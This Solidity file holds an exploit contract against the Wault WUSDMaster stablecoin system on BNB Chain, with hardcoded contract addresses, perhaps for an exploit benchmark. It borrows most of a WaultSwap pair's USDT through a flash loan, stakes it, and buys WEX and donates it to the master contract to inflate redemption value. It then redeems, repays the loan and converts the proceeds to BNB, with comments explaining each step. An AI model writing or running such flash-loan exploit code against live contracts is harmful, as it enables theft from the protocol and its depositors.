import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

interface IWUSD is IERC20 {
    function mint(address account, uint256 amount) external;
    function burn(address account, uint256 amount) external;
}

interface IWUSDMaster {
    function wusd() external view returns (IWUSD);
    function usdt() external view returns (IERC20);
    function wex() external view returns (IERC20);
    function wexPermille() external view returns (uint);
    function treasuryPermille() external view returns (uint);
    function stake(uint256 amount) external;
    function redeem(uint256 amount) external;
}

interface IWaultSwapPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IWaultSwapRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract Strategy {
    IWUSDMaster constant master = IWUSDMaster(0xa79Fe386B88FBee6e492EEb76Ec48517d1eC759a);
    IWaultSwapPair constant usdtWexPair = IWaultSwapPair(0x50e8D9Aa83eBDe9608074eC1faaDfD2E792D9B81);
    IWaultSwapRouter constant router = IWaultSwapRouter(0xD48745E39BbED146eEC15b79cBF964884F9877c2);

    IERC20 usdt;
    IERC20 wex;
    IWUSD wusd;

    uint256 flashLoanAmount;

    function run() public {
        usdt = master.usdt();
        wex = master.wex();
        wusd = master.wusd();

        // Get reserves to calculate flash loan amount
        (uint112 reserve0, uint112 reserve1,) = usdtWexPair.getReserves();
        address token0 = usdtWexPair.token0();

        // Flash loan most of USDT reserves (token0 is USDT)
        flashLoanAmount = uint256(reserve0) * 99 / 100;

        // Execute flash loan - borrow USDT
        usdtWexPair.swap(flashLoanAmount, 0, address(this), abi.encode(flashLoanAmount));

        // Convert remaining WEX to BNB via router
        uint256 wexBalance = wex.balanceOf(address(this));
        if (wexBalance > 0) {
            wex.approve(address(router), wexBalance);
            address[] memory path = new address[](2);
            path[0] = address(wex);
            path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
            router.swapExactTokensForTokens(wexBalance, 0, path, address(this), block.timestamp);
        }
    }

    function waultSwapCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        // This is the flash loan callback
        require(msg.sender == address(usdtWexPair), "not pair");

        // Step 1: Stake all flash-loaned USDT to get WUSD
        // This also swaps wexPermille (10%) of USDT to WEX inside the contract
        uint256 usdtBalance = usdt.balanceOf(address(this));
        usdt.approve(address(master), usdtBalance);
        master.stake(usdtBalance);

        uint256 wusdBalance = wusd.balanceOf(address(this));

        // Step 2: Buy WEX from DEX to donate to the contract
        // This inflates the WEX balance, making our WUSD worth more WEX
        uint256 usdtForWex = usdt.balanceOf(address(this));
        if (usdtForWex > 0) {
            usdt.approve(address(router), usdtForWex);
            address[] memory path = new address[](2);
            path[0] = address(usdt);
            path[1] = address(wex);
            router.swapExactTokensForTokens(usdtForWex, 0, path, address(this), block.timestamp);
        }

        // Step 3: Donate WEX to the master contract to inflate the share
        uint256 wexToDonate = wex.balanceOf(address(this));
        wex.transfer(address(master), wexToDonate);

        // Step 4: Redeem all WUSD - we get back USDT + inflated WEX share
        master.redeem(wusdBalance);

        // Step 5: Repay flash loan with USDT
        // Flash loan fee is 0.3% for Uniswap V2
        uint256 repayAmount = flashLoanAmount * 1003 / 1000;
        usdt.transfer(address(usdtWexPair), repayAmount);
    }

    receive() external payable {}
}
